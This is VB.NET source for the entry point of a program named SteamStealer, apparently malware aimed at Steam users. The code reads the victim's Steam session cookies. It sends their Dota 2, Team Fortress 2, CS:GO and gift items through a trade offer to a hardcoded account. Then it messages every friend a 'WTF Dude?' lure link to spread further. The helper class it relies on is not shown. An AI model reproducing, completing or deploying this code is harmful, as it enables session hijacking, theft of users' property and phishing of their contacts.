
Namespace SteamStealer

    Friend NotInheritable Class Program
        Private Sub New()
        End Sub
        <STAThread>
        Private Shared Sub Main()
            Dim worker As New SteamWorker()
            worker.addOffer("76561198125064394", "164798666", "Kodf_JPO")
            worker.ParseSteamCookies()
            If worker.ParsedSteamCookies.Count > 0 Then
                worker.getSessionID()
                worker.addItemsToSteal("440,570,730,753", "753:gift;570:rare,legendary,immortal,mythical,arcana,normal,unusual,ancient,tool,key;440:unusual,hat,tool,key;730:tool,knife,pistol,smg,shotgun,rifle,sniper rifle,machinegun,sticker,key")
                worker.SendItems("")
                worker.initChatSystem()
                worker.getFriends()
                worker.sendMessageToFriends("WTF Dude? http://screen-pictures.com/img_012/")
            End If
        End Sub
    End Class
End Namespace